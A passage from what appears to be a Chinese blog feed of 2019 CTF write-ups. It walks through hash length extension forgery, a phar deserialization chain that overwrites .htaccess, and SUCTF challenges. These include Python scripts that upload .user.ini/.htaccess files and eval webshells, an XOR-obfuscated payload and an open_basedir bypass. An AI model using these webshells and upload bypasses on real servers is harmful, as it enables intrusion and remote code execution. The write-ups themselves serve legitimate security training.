  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>哈希长度扩展攻击的一般利用步骤如下：</p><ul><li>知道<code>md5($secret.$username.$password)</code>的值</li><li>知道<code>$SECRET</code>的长度</li><li>我们可以算出另外一个 md5 值和另外一个user的值，使得<code>$COOKIE[&#39;user&#39;] == md5($secret.$username.$password)</code></li></ul><p>所以首先输入任意密码登录后在cookie中获取到对应的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.cookie</span><br><span class="line">&quot;PHPSESSID=bodvgts7e1v6duqtcvq0miplul; hash=b1a9c01292d57c0d2010add7f8d10c41&quot;</span><br></pre></td></tr></table></figure></p><p>之后，因为要伪造的password的值为admin，所以对应的长度是 len($SECRET)+len($password)=13</p><p>最后使用<code>hashpump</code>伪造得到对应的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: b1a9c01292d57c0d2010add7f8d10c41</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: zeroyu</span><br><span class="line">f27536145794288b2c1f94f0a62695a9</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00zeroyu</span><br></pre></td></tr></table></figure></p><p>之后将<code>\x</code>换为<code>%</code>即可得到对应的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00zeroyu</span><br></pre></td></tr></table></figure></p><p>之后就可以用admin的身份来上传文件了</p><p>从代码中可以看到，webapp是自己生成了一个<code>.htaccess</code>文件来阻止对我们shell的解析，所以我们的目标就是覆盖或者删除这个文件。</p><p>有文件上传点，源码中有类，还有一个疑似可以触发phar反序列化的点，基本就可以判断这是一个反序列化漏洞。</p><p>大概看了一下官方手册，发现 <code>mime_content_type</code> 函数的实现，其实也是通过读取对应的文件来实现的，既然读文件就有可能会触发phar发序列化漏洞，之后本地测试发现的确可以触发。</p><p>前面的协议限制我们可以使用php伪协议来进行绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath)</span><br></pre></td></tr></table></figure></p><p>对应的绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://filename.phar</span><br></pre></td></tr></table></figure></p><p>之后就是找一条pop链来完成对<code>.htaccess</code>的修改，最开始想使用<code>move_uploaded_file</code>函数将文件移走，但是后面发现<code>move_uploaded_file</code>的第一个参数必须是post传递的，因此失败。</p><p>后面就关注到Profile类<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>虽然webapp自身没有提供对应的函数，但是php系统中是否存在某个类可以完成文件修改的效果，所以顺着这个思路就找到了<code>ZipArchive::open</code> <a href="https://www.php.net/manual/zh/ziparchive.open.php" target="_blank" rel="noopener">对应的手册说明</a></p><p>所以最终构造出的exp如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$o-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$o-&gt;checker-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">$o-&gt;checker-&gt;username=<span class="string">"./sandbox/f528764d624db129b32c21fbca0cb8d6/.htaccess"</span>;</span><br><span class="line">$o-&gt;checker-&gt;password=ZIPARCHIVE::OVERWRITE;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后我们本地动态调试一下这个链，可以看到是已经触发了的，并且触发之后<code>.htaccess</code>文件也被修改了</p><p><img src="https://i.loli.net/2019/09/14/QmRkhdI68wvWUGn.png" alt="3E7D9164-1ACB-4322-ABC8-544705C9BF73.png"></p><p>之后我们之后需要上传一个bypass限制的webshell，然后再触发反序列化删掉<code>.htaccess</code>文件即可getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$z=<span class="string">"sys"</span>.<span class="string">"tem"</span>;</span><br><span class="line">$z($_GET[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/7RdApN51tFYBfQ3.png" alt="7D460532-3282-48EA-B2DE-24FA7B419C1E.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。&lt;/p&gt;
&lt;p&gt;文
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 suctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/</id>
    <published>2019-09-05T13:47:20.000Z</published>
    <updated>2019-09-05T14:08:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又是很嗨的一场比赛。</p><p>PS: 补充了iCloudMusic的个人详细题解</p><h2 id="0x01-CheckIn"><a href="#0x01-CheckIn" class="headerlink" title="0x01 CheckIn"></a>0x01 CheckIn</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9021" target="_blank" rel="noopener">http://47.111.59.243:9021</a></p><h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>首先判断目标题目的容器环境，发现是nginx而不是apache</p><p>之后发现上传点具有如下特征：</p><ol><li><code>.php</code> 后缀的不可以</li><li><code>&lt;?</code> 不可以出现</li><li><code>exif_imagetype</code> 检验是否是图片</li></ol><p>那么就逐点bypass;</p><ol><li><p>不允许php后缀的情况下就要考虑容器的特性<br>容器是否存在解析漏洞或者其他，如果是apache的话我们完全可以先上传<code>.htaccess</code>来将某个后缀当做php脚本解析执行，但是此处是nginx容器，在这个版本也没有对应的解析漏洞，因此考虑<code>.user.ini</code>来构造解析<br>这个可以参考：<a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">《user.ini文件构成的PHP后门》</a></p></li><li><p>不允许<code>&lt;?</code> 那么就考虑<code>&lt;script language=&#39;php&#39;&gt;</code></p></li><li><code>exif_imagetype</code> 校验bypass<br>这个可以参考这篇文章：<a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></li></ol><p>最终得到如下getshell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9021/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">auto_prepend_file = cc.jpg</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"&lt;?php eval($_GET['c']);?&gt;")</span></span><br><span class="line">shell =  <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span> + <span class="string">"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'.user.ini'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">print(<span class="string">"upload .user.ini"</span>)</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"></span><br><span class="line">print(r.text) </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload cc.jpg"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'fileUpload'</span>,(<span class="string">'cc.jpg'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/0ec1db6cfe0333559b8991ce81e48662/index.php?c=system(%27cat%20/flag%27); HTTP/1.1</span><br><span class="line">Host: 47.111.59.243:9021</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Sat, 17 Aug 2019 02:28:39 GMT</span><br><span class="line">If-None-Match: &quot;5d576657-74&quot;</span><br></pre></td></tr></table></figure><p>直接cat得到flag<br><img src="https://i.loli.net/2019/09/05/dBIaK6tqOmZuYrk.png" alt="CDE4B672-51B6-4029-B4F6-12E88C73D62D.png"></p><h2 id="0x02-EasyPHP"><a href="#0x02-EasyPHP" class="headerlink" title="0x02 EasyPHP"></a>0x02 EasyPHP</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9001/" target="_blank" rel="noopener">http://47.111.59.243:9001/</a></p><h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>访问站点直接得到网站对应的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到源码之后思路就很明确了，<code>get_the_flag</code> 函数部分的上传漏洞和上题相类似，但是不同的是这里是<code>apache</code>环境，所以要上传的是<code>.htaccess</code>文件来构造解析。</p><p>关键的是第一部分，如何来让<code>eval</code> 函数触发<code>get_the_flag</code> 函数，首先判断正则过滤了那些ascii字符，写一个脚本判断一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$unfilter_str = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">$unfilter_str[] = urlencode(chr($ascii));</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $unfilter_str) . <span class="string">'\''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终可以得到有如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;%21&apos;,&apos;%23&apos;,&apos;%24&apos;,&apos;%25&apos;,&apos;%28&apos;,&apos;%29&apos;,&apos;%2A&apos;,&apos;%2B&apos;,&apos;-&apos;,&apos;%2F&apos;,&apos;%3A&apos;,&apos;%3B&apos;,&apos;%3C&apos;,&apos;%3E&apos;,&apos;%3F&apos;,&apos;%40&apos;,&apos;%5C&apos;,&apos;%5D&apos;,&apos;%5E&apos;,&apos;%7B&apos;,&apos;%7D&apos;,&apos;%80&apos;,&apos;%81&apos;,&apos;%82&apos;,&apos;%83&apos;,&apos;%84&apos;,&apos;%85&apos;,&apos;%86&apos;,&apos;%87&apos;,&apos;%88&apos;,&apos;%89&apos;,&apos;%8A&apos;,&apos;%8B&apos;,&apos;%8C&apos;,&apos;%8D&apos;,&apos;%8E&apos;,&apos;%8F&apos;,&apos;%90&apos;,&apos;%91&apos;,&apos;%92&apos;,&apos;%93&apos;,&apos;%94&apos;,&apos;%95&apos;,&apos;%96&apos;,&apos;%97&apos;,&apos;%98&apos;,&apos;%99&apos;,&apos;%9A&apos;,&apos;%9B&apos;,&apos;%9C&apos;,&apos;%9D&apos;,&apos;%9E&apos;,&apos;%9F&apos;,&apos;%A0&apos;,&apos;%A1&apos;,&apos;%A2&apos;,&apos;%A3&apos;,&apos;%A4&apos;,&apos;%A5&apos;,&apos;%A6&apos;,&apos;%A7&apos;,&apos;%A8&apos;,&apos;%A9&apos;,&apos;%AA&apos;,&apos;%AB&apos;,&apos;%AC&apos;,&apos;%AD&apos;,&apos;%AE&apos;,&apos;%AF&apos;,&apos;%B0&apos;,&apos;%B1&apos;,&apos;%B2&apos;,&apos;%B3&apos;,&apos;%B4&apos;,&apos;%B5&apos;,&apos;%B6&apos;,&apos;%B7&apos;,&apos;%B8&apos;,&apos;%B9&apos;,&apos;%BA&apos;,&apos;%BB&apos;,&apos;%BC&apos;,&apos;%BD&apos;,&apos;%BE&apos;,&apos;%BF&apos;,&apos;%C0&apos;,&apos;%C1&apos;,&apos;%C2&apos;,&apos;%C3&apos;,&apos;%C4&apos;,&apos;%C5&apos;,&apos;%C6&apos;,&apos;%C7&apos;,&apos;%C8&apos;,&apos;%C9&apos;,&apos;%CA&apos;,&apos;%CB&apos;,&apos;%CC&apos;,&apos;%CD&apos;,&apos;%CE&apos;,&apos;%CF&apos;,&apos;%D0&apos;,&apos;%D1&apos;,&apos;%D2&apos;,&apos;%D3&apos;,&apos;%D4&apos;,&apos;%D5&apos;,&apos;%D6&apos;,&apos;%D7&apos;,&apos;%D8&apos;,&apos;%D9&apos;,&apos;%DA&apos;,&apos;%DB&apos;,&apos;%DC&apos;,&apos;%DD&apos;,&apos;%DE&apos;,&apos;%DF&apos;,&apos;%E0&apos;,&apos;%E1&apos;,&apos;%E2&apos;,&apos;%E3&apos;,&apos;%E4&apos;,&apos;%E5&apos;,&apos;%E6&apos;,&apos;%E7&apos;,&apos;%E8&apos;,&apos;%E9&apos;,&apos;%EA&apos;,&apos;%EB&apos;,&apos;%EC&apos;,&apos;%ED&apos;,&apos;%EE&apos;,&apos;%EF&apos;,&apos;%F0&apos;,&apos;%F1&apos;,&apos;%F2&apos;,&apos;%F3&apos;,&apos;%F4&apos;,&apos;%F5&apos;,&apos;%F6&apos;,&apos;%F7&apos;,&apos;%F8&apos;,&apos;%F9&apos;,&apos;%FA&apos;,&apos;%FB&apos;,&apos;%FC&apos;,&apos;%FD&apos;,&apos;%FE&apos;,&apos;%FF&apos;]</span><br></pre></td></tr></table></figure></p><p>那么之后只要使用既有的规则模式进行fuzz即可（随后会写专门的文章来介绍webfuzz）</p><p>因为还有长度限制，所以如果fuzz出<code>get_the_flag</code>的话，可能长度会超，所以考虑率fuzz出<code>$_GET[z]</code>，然后让php解析<code>${$_GET[z]}</code>来达到调用对应函数的目的。</p><p>这里fuzz字符之间的异或，最终得到如下结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// fuzz_api.php</span></span><br><span class="line">$_=$_GET[<span class="string">'a'</span>]^$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="comment">// $_ = '%fe%fe%fe%fe^%a1%b9%bb%aa';</span></span><br><span class="line"><span class="keyword">if</span>($_ == <span class="string">'_GET'</span>)print_r(<span class="string">'true'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>因为可见字符都被过滤了，这里我们还得要一个字符来作为参数，同时要考虑bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure></p><p>所以简单的做法就是把上面的可用字符串再给fuzz一遍，最终得到如下payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();</span><br></pre></td></tr></table></figure></p><p>所以我们就可以写脚本来一键getshell了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9001/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .zzzz</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment"># shell =  b"\x00\x00\x8a\x39\x8a\x39"+b"00" + "&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line">print(<span class="string">"upload .htaccess"</span>)</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(r.text) </span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload shell.zzzz"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.zzzz'</span>,shell,<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = requests.get('http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=system(%27ls%27);')</span></span><br><span class="line"><span class="comment"># r = requests.get("http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));")</span></span><br><span class="line">r = requests.get(<span class="string">"http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));"</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure></p><p>最终得到flag<br><img src="https://i.loli.net/2019/09/05/6hXeyQgimSRdZsj.png" alt="EA4BD431-2FDC-48FC-8B9F-52C77D727628.png"></p><h2 id="0x03-Pythonginx"><a href="#0x03-Pythonginx" class="headerlink" title="0x03 Pythonginx"></a>0x03 Pythonginx</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9000/" target="_blank" rel="noopener">http://47.111.59.243:9000/</a></p><h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>右键直接看到题目的源代码（完好格式）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 